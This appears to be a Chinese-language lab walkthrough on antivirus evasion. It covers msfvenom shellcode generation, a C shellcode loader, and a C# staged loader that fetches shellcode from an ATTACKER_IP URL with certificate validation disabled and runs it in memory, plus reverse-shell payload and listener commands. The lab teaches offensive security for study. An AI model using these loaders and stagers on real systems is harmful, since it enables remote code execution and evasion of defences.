<p>使用公共工具生成 shellcode</p>
<p>可以使用特定的编程语言生成特定格式的 Shellcode。 这取决于你。 例如，如果您的释放器（即主 exe 文件）包含将发送给受害者的 shellcode，并且是用 C 编写的，那么我们需要生成在 C 中工作的 shellcode 格式。</p>
<p>通过公共工具生成 shellcode 的优点是我们不需要从头开始编写自定义 shellcode，甚至不需要成为汇编语言专家。 大多数公共 C2 框架都提供自己的与 C2 平台兼容的 shellcode 生成器。 当然，这对我们来说非常方便，但缺点是大多数（或者可以说全部）生成的 shellcode 都是 AV 供应商所熟知的，并且很容易被检测到。</p>
<p>我们将在 AttackBox 上使用 Msfvenom 生成执行 Windows 文件的 shellcode。 我们将创建一个运行“calc.exe”应用程序的 shellcode。</p>
<p> 生成Shellcode来执行calc.exe</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 193 bytes</span><br><span class="line">Final size of c file: 835 bytes</span><br><span class="line">unsigned char buf[] =</span><br><span class="line">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span><br><span class="line">"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"</span><br><span class="line">"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"</span><br><span class="line">"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"</span><br><span class="line">"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"</span><br><span class="line">"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"</span><br><span class="line">"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"</span><br><span class="line">"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"</span><br><span class="line">"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"</span><br><span class="line">"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"</span><br><span class="line">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"</span><br><span class="line">"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"</span><br><span class="line">"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>结果，Metasploit 框架生成执行 Windows 计算器 (calc.exe) 的 shellcode。 Windows 计算器广泛用作恶意软件开发过程中的示例来展示概念证明。 如果该技术有效，则会弹出 Windows 计算器的新实例。 这证实了任何可执行 shellcode 都适用于所使用的方法。</p>
<p>Shellcode注入</p>
<p>黑客使用各种技术将 shellcode 注入正在运行的或新的线程和进程中。 Shellcode 注入技术修改程序的执行流程，以更新程序的寄存器和函数来执行攻击者自己的代码。</p>
<p>现在让我们继续使用生成的 shellcode 并在操作系统上执行它。 以下是包含我们生成的 shellcode 的 C 代码，该代码将被注入内存并执行“calc.exe”。</p>
<p>在 AttackBox 上，将以下内容保存在名为“calc.c”的文件中：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> stager[] = {</span><br><span class="line"><span class="string">"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"</span></span><br><span class="line"><span class="string">"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"</span></span><br><span class="line"><span class="string">"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"</span></span><br><span class="line"><span class="string">"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"</span></span><br><span class="line"><span class="string">"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"</span></span><br><span class="line"><span class="string">"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"</span></span><br><span class="line"><span class="string">"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"</span></span><br><span class="line"><span class="string">"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"</span></span><br><span class="line"><span class="string">"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"</span></span><br><span class="line"><span class="string">"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"</span></span><br><span class="line"><span class="string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"</span></span><br><span class="line"><span class="string">"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"</span></span><br><span class="line"><span class="string">"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"</span> };</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">        DWORD oldProtect;</span><br><span class="line">        VirtualProtect(stager, <span class="keyword">sizeof</span>(stager), PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class="line">        <span class="type">int</span> (*shellcode)() = (<span class="type">int</span>(*)())(<span class="type">void</span>*)stager;</span><br><span class="line">        shellcode();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>现在让我们将其编译为 exe 文件：</p>
<p> 为 Windows 编译我们的 C 程序</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ i686-w64-mingw32-gcc calc.c -o calc-MSF.exe</span><br></pre></td></tr></tbody></table></figure>

<p>获得 exe 文件后，将其传输到 Windows 计算机并执行它。 要传输文件，您可以使用 AttackBox 中的 smbclient 通过以下命令访问 \10.10.21.255\Tools 处的 SMB 共享（记住“thm”用户的密码是“Password321”）：</p>
<p> 将 calc-MSC.exe 复制到 Windows 机器</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ smbclient -U thm '//10.10.21.255/Tools'</span><br><span class="line">smb: \&gt; put calc-MSF.exe</span><br></pre></td></tr></tbody></table></figure>

<p>这应该将您的文件复制到 Windows 计算机的“C:\Tools\”中。</p>
<p>虽然您的计算机的 AV 应被禁用，但请随意尝试将您的有效负载上传到 THM 防病毒检查，网址为“<a target="_blank" rel="noopener" href="http://10.10.21.255/%E2%80%9D%E3%80%82">http://10.10.21.255/”。</a></p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e90959ae18f71d51d7b8681676029493.png" alt="Executing MSF Payload to run calc.exe"></p>
<p>Metasploit 框架有许多其他 shellcode 格式和类型，可以满足您的所有需求。 我们强烈建议您进行更多实验，并通过生成不同的 shellcode 来扩展您的知识。</p>
<p>前面的示例展示了如何生成 shellcode 并在目标计算机中执行它。 当然，您可以复制相同的步骤来创建不同类型的 shellcode，例如 Meterpreter shellcode。</p>
<p>从 EXE 文件生成 Shellcode</p>
<p>Shellcode 也可以存储在“.bin”文件中，这是一种原始数据格式。 在这种情况下，我们可以使用“xxd -i”命令获取它的shellcode。</p>
<p>C2 框架提供 shellcode 作为原始二进制文件“.bin”。 如果是这种情况，我们可以使用Linux系统命令“xxd”来获取二进制文件的十六进制表示。 为此，我们执行以下命令：“xxd -i”。</p>
<p>让我们使用 msfvenom 创建一个原始二进制文件来获取 shellcode：</p>
<p> 生成原始shellcode来执行calc.exe</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw &gt; /tmp/example.bin</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 193 bytes</span><br><span class="line"></span><br><span class="line">user@AttackBox$ file /tmp/example.bin</span><br><span class="line">/tmp/example.bin: data</span><br></pre></td></tr></tbody></table></figure>

<p>并在创建的文件上运行“xxd”命令：</p>
<p> 使用xxd命令获取shellcode</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">           user@AttackBox$ xxd -i /tmp/example.bin</span><br><span class="line">unsigned char _tmp_example_bin[] = {</span><br><span class="line">  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,</span><br><span class="line">  0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,</span><br><span class="line">  0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,</span><br><span class="line">  0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,</span><br><span class="line">  0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,</span><br><span class="line">  0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,</span><br><span class="line">  0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,</span><br><span class="line">  0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,</span><br><span class="line">  0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,</span><br><span class="line">  0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,</span><br><span class="line">  0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,</span><br><span class="line">  0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00,</span><br><span class="line">  0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5,</span><br><span class="line">  0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c,</span><br><span class="line">  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,</span><br><span class="line">  0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65,</span><br><span class="line">  0x00</span><br><span class="line">};</span><br><span class="line">unsigned int _tmp_example_bin_len = 193;</span><br><span class="line">        </span><br></pre></td></tr></tbody></table></figure>

<p>如果我们将输出与之前使用 Metasploit 创建的 shellcode 进行比较，就会发现它是匹配的。</p>
<h1 id="Staged-Payloads"><a href="#Staged-Payloads" class="headerlink" title="Staged Payloads"></a>Staged Payloads</h1><p>为了绕过 AV 的目标，我们将找到两种主要方法来将最终的 shellcode 传递给受害者。 根据方法的不同，您会发现有效负载通常分为<strong>阶段</strong>或<strong>无阶段</strong>负载。 在此任务中，我们将研究两种方法的差异以及每种方法的优点。</p>
<p>Stageless Payloads</p>
<p>无阶段有效负载将最终的 shellcode 直接嵌入到自身中。 将其视为在单步过程中执行 shellcode 的打包应用程序。 在之前的任务中，我们嵌入了一个可执行文件，该可执行文件嵌入了一个简单的“calc”shellcode，从而形成了无阶段的有效负载。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/cad28e045fd6fec615b04d731aef7f9a.png" alt="Stageless Payload"></p>
<p>在上面的示例中，当用户执行恶意负载时，嵌入式 shellcode 将运行，为攻击者提供反向 shell。</p>
<p>Staged Payloads</p>
<p>分阶段有效负载通过使用中间 shellcode 来工作，这些中间 shellcode 充当导致执行最终 shellcode 的步骤。 这些中间 shellcode 中的每一个都称为 <strong>stager</strong>，其主要目标是提供一种检索最终 shellcode 并最终执行它的方法。</p>
<p>虽然有效负载可能有多个阶段，但通常情况下涉及两阶段有效负载，其中第一阶段（我们称之为 <strong>stage0</strong>）是一个存根 shellcode，它将连接回攻击者的计算机以下载最终要执行的 shellcode。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/f92f294a9e599967a0961b4273381be6.png" alt="Staged Payload - stage0"></p>
<p>一旦检索到，stage0 存根就会将最终的 shellcode 注入有效负载进程内存中的某个位置并执行它（如下所示）。</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/fd8a98b3cb79cca98a1e0dfd0292ea61.png" alt="Staged Payload - Send ReveseShell"></p>
<p>分阶段与无阶段</p>
<p>在决定使用哪种类型的有效负载时，我们必须了解我们将攻击的环境。 根据具体的攻击场景，每种有效负载类型都有优点和缺点。</p>
<p>对于无级有效负载，您会发现以下优点：</p>
<ul>
<li>生成的可执行文件包含了让我们的 shellcode 工作所需的所有内容。</li>
<li>有效负载将在不需要额外网络连接的情况下执行。 网络交互越少，被 IPS 检测到的机会就越小。</li>
<li>如果您正在攻击网络连接非常有限的主机，您可能希望将整个有效负载放在一个包中。</li>
</ul>
<p>对于分阶段的有效负载，您将拥有：</p>
<ul>
<li>磁盘占用空间小。 由于 stage0 只负责下载最终的 shellcode，因此它的大小很可能很小。</li>
<li>最终的 shellcode 未嵌入到可执行文件中。 如果您的有效负载被捕获，蓝队将只能访问 stage0 存根，仅此而已。</li>
<li>最终的 shellcode 被加载到内存中，并且永远不会接触磁盘。 这使得它更不容易被反病毒解决方案检测到。</li>
<li>您可以为许多 shellcode 重复使用相同的 stage0 dropper，因为您可以简单地替换提供给受害者计算机的最终 shellcode。</li>
</ul>
<p>总之，除非我们添加一些上下文，否则我们不能说任何一种类型都比另一种更好。 一般来说，无阶段有效负载更适合具有大量外围安全性的网络，因为它不依赖于从互联网下载最终的 shellcode。 例如，如果您要对封闭网络环境中的目标计算机执行 USB 丢弃攻击，而您知道在该环境中您将无法连接回您的计算机，那么无阶段就是最佳选择。</p>
<p>另一方面，当您希望将本地计算机上的占用空间减少到最低限度时，分阶段有效负载非常有用。 由于它们在内存中执行最终的有效负载，一些反病毒解决方案可能会发现更难检测到它们。 它们还可以很好地避免暴露您的 shellcode（这通常需要相当长的时间来准备），因为 shellcode 不会在任何时候放入受害者的磁盘中（作为工件）。</p>
<p>Metasploit 中的暂存器</p>
<p>当使用 msfvenom 创建有效负载或直接在 Metasploit 中使用它们时，您可以选择使用分段或无阶段有效负载。 举个例子，如果你想生成一个反向 TCP shell，你会发现有两个有效负载用于此目的，但名称略有不同（请注意“shell”后面的“_”与“/”）：</p>
<table>
<thead>
<tr>
<th><strong>Payload</strong></th>
<th><strong>Type</strong></th>
</tr>
</thead>
<tbody><tr>
<td>windows/x64/shell_reverse_tcp</td>
<td>Stageless payload</td>
</tr>
<tr>
<td>windows/x64/shell/reverse_tcp</td>
<td>Staged payload</td>
</tr>
</tbody></table>
<p>您通常会发现相同的名称模式适用于其他类型的 shell。 例如，要使用无阶段的 Meterpreter，我们将使用“windows/x64/meterpreter_reverse_tcp”，而不是“windows/x64/meterpreter/reverse_tcp”，后者作为其分阶段的对应项。</p>
<p>创建您自己的舞台</p>
<p>为了创建分阶段的有效负载，我们将使用 <a target="_blank" rel="noopener" href="https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab2/2.cs">@mvelazc0</a> 提供的 stager 代码的稍微修改版本。 我们的 stager 的完整代码可以在这里获取，但也可以在 Windows 计算机上的“C:\Tools\CS Files\StgedPayload.cs”中找到：</p>
<figure class="highlight csharp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Configuration.Install;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography.X509Certificates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span> {</span><br><span class="line">  <span class="comment">//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc </span></span><br><span class="line">  [<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span></span><br><span class="line">  [<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="keyword">ref</span> UInt32 lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span></span><br><span class="line">  [<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>()</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">string</span> url = <span class="string">"https://ATTACKER_IP/shellcode.bin"</span>;</span><br><span class="line">    Stager(url);</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Stager</span>(<span class="params"><span class="built_in">string</span> url</span>)</span></span><br><span class="line">  {</span><br><span class="line"></span><br><span class="line">    WebClient wc = <span class="keyword">new</span> WebClient();</span><br><span class="line">    ServicePointManager.ServerCertificateValidationCallback = <span class="built_in">delegate</span> { <span class="keyword">return</span> <span class="literal">true</span>; };</span><br><span class="line">    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">byte</span>[] shellcode = wc.DownloadData(url);</span><br><span class="line"></span><br><span class="line">    UInt32 codeAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    Marshal.Copy(shellcode, <span class="number">0</span>, (IntPtr)(codeAddr), shellcode.Length);</span><br><span class="line"></span><br><span class="line">    IntPtr threadHandle = IntPtr.Zero;</span><br><span class="line">    UInt32 threadId = <span class="number">0</span>;</span><br><span class="line">    IntPtr parameter = IntPtr.Zero;</span><br><span class="line">    threadHandle = CreateThread(<span class="number">0</span>, <span class="number">0</span>, codeAddr, parameter, <span class="number">0</span>, <span class="keyword">ref</span> threadId);</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(threadHandle, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line"></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>该代码乍一看可能令人生畏，但相对简单。 我们来一步步分析一下它做了什么。</p>
<p>代码的第一部分将通过 P/Invoke 导入一些 Windows API 函数。 我们需要的函数是“kernel32.dll”中的以下三个函数：</p>
<table>
<thead>
<tr>
<th><strong>WinAPI Function</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc()</a></td>
<td>允许我们保留一些内存供 shellcode 使用。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">CreateThread()</a></td>
<td>创建一个线程作为当前进程的一部分。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject()</a></td>
<td>用于线程同步。 它允许我们等待线程完成后再继续。</td>
</tr>
</tbody></table>
<p>负责导入这些函数的代码部分如下：</p>
<figure class="highlight csharp"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc </span></span><br><span class="line">[<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread</span></span><br><span class="line">[<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span class="keyword">ref</span> UInt32 lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject</span></span><br><span class="line">[<span class="meta">DllImport(<span class="string">"kernel32"</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr hHandle, UInt32 dwMilliseconds</span>)</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>我们代码中最重要的部分将在“Stager()”函数中，其中将实现 stager 逻辑。 Stager 函数将接收一个 URL，从中下载要执行的 shellcode。</p>
<p><code>Stager()</code> 函数的第一部分将创建一个新的 <code>WebClient()</code> 对象，该对象允许我们使用 Web 请求下载 shellcode。 在发出实际请求之前，我们将覆盖“ServerCertificateValidationCallback”方法，该方法负责在使用 HTTPS 请求时验证 SSL 证书，以便 WebClient 不会抱怨自签名或无效证书，我们将在 Web 服务器托管中使用该证书 有效负载。 之后，我们将调用“DownloadData()”方法从给定的 URL 下载 shellcode 并将其存储到“shellcode”变量中：</p>
<figure class="highlight csharp"><table><tbody><tr><td class="code"><pre><span class="line">WebClient wc = <span class="keyword">new</span> WebClient();</span><br><span class="line">ServicePointManager.ServerCertificateValidationCallback = <span class="built_in">delegate</span> { <span class="keyword">return</span> <span class="literal">true</span>; };</span><br><span class="line">ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;</span><br><span class="line"></span><br><span class="line"><span class="built_in">byte</span>[] shellcode = wc.DownloadData(url);</span><br></pre></td></tr></tbody></table></figure>

<p>一旦我们的 shellcode 被下载并在 <code>shellcode</code> 变量中可用，我们需要在实际运行它之前将其复制到可执行内存中。 我们使用 VirtualAlloc() 向操作系统请求内存块。 请注意，我们请求足够的内存来分配“shellcode.Length”字节，并设置“PAGE_EXECUTE_READWRITE”标志，使分配的内存可执行、可读和可写。 一旦我们的可执行内存块被保留并分配给“codeAddr”变量，我们就使用“Marshal.Copy()”将“shellcode”变量的内容复制到“codeAddr”变量中。</p>
<figure class="highlight csharp"><table><tbody><tr><td class="code"><pre><span class="line">UInt32 codeAddr = VirtualAlloc(<span class="number">0</span>, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">Marshal.Copy(shellcode, <span class="number">0</span>, (IntPtr)(codeAddr), shellcode.Length);</span><br></pre></td></tr></tbody></table></figure>

<p>现在我们已经在可执行内存块中分配了 shellcode 的副本，我们使用 CreateThread() 函数在当前进程上生成一个新线程来执行我们的 shellcode。 传递给 CreateThread 的第三个参数指向“codeAddr”，我们的 shellcode 存储在其中，因此当线程启动时，它会像常规函数一样运行我们的 shellcode 的内容。 第五个参数设置为0，表示线程将立即启动。</p>
<p>创建线程后，我们将调用“WaitForSingleObject()”函数来指示当前程序必须等待线程执行完成才能继续。 这可以防止我们的程序在 shellcode 线程有机会执行之前关闭：</p>
<figure class="highlight csharp"><table><tbody><tr><td class="code"><pre><span class="line">IntPtr threadHandle = IntPtr.Zero;</span><br><span class="line">UInt32 threadId = <span class="number">0</span>;</span><br><span class="line">IntPtr parameter = IntPtr.Zero;</span><br><span class="line">threadHandle = CreateThread(<span class="number">0</span>, <span class="number">0</span>, codeAddr, parameter, <span class="number">0</span>, <span class="keyword">ref</span> threadId);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(threadHandle, <span class="number">0xFFFFFFFF</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>要编译代码，我们建议将其作为名为 staged-payload.cs 的文件复制到 Windows 计算机中，并使用以下命令进行编译：</p>
<p>PowerShell        </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">PS C:\&gt; csc staged-payload.cs  </span><br></pre></td></tr></tbody></table></figure>

<p>使用我们的 stager 运行反向 shell</p>
<p>编译有效负载后，我们需要设置一个 Web 服务器来托管最终的 shellcode。 请记住，我们的 stager 将连接到该服务器以检索 shellcode 并在受害者计算机的内存中执行它。 让我们首先生成一个 shellcode（文件名需要与 stager 中的 URL 匹配）：</p>
<p>AttackBox        </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'</span><br></pre></td></tr></tbody></table></figure>

<p>请注意，我们的 shellcode 使用的是原始格式，因为 stager 会直接将其下载的任何内容加载到内存中。</p>
<p>现在我们有了 shellcode，让我们设置一个简单的 HTTPS 服务器。 首先，我们需要使用以下命令创建自签名证书：</p>
<p>AttackBox        </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes</span><br></pre></td></tr></tbody></table></figure>

<p>系统会要求您提供一些信息，但请随时按 Enter 键获取任何所需信息，因为我们不需要 SSL 证书有效。 一旦我们有了 SSL 证书，我们就可以使用 python3 和以下命令生成一个简单的 HTTPS 服务器：</p>
<p>AttackBox        </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"</span><br></pre></td></tr></tbody></table></figure>

<p>所有这些准备就绪后，我们现在可以执行我们的 stager 有效负载。 stager 应连接到 HTTPS 服务器并检索 shellcode.bin 文件，将其加载到内存中并在受害计算机上运行。 请记住设置一个 nc 侦听器，以便在运行 msfvenom 时指定的同一端口上接收反向 shell：</p>
<p>AttackBox        </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user@AttackBox$ nc -lvp 7474      </span><br></pre></td></tr></tbody></table></figure>

<h1 id="Introduction-to-Encoding-and-Encryption"><a href="#Introduction-to-Encoding-and-Encryption" class="headerlink" title="Introduction to Encoding and Encryption"></a>Introduction to Encoding and Encryption</h1><p>什么是编码？</p>
<p>编码是根据编码算法或类型将数据从原始状态更改为特定格式的过程。 它可以应用于许多数据类型，例如视频、HTML、URL 和二进制文件（EXE、图像等）。</p>
<p>编码是一个重要的概念，通常用于各种目的，包括但不限于：</p>
<ul>
<li>程序编译与执行</li>
<li>数据存储和传输</li>
<li>文件转换等数据处理</li>
</ul>
<p>同样，当涉及 AV 规避技术时，编码也用于隐藏二进制文件中的 shellcode 字符串。 然而，编码不足以达到规避目的。 如今，反病毒软件更加智能，可以分析二进制文件，一旦找到编码字符串，就对其进行解码以检查文本的原始形式。</p>
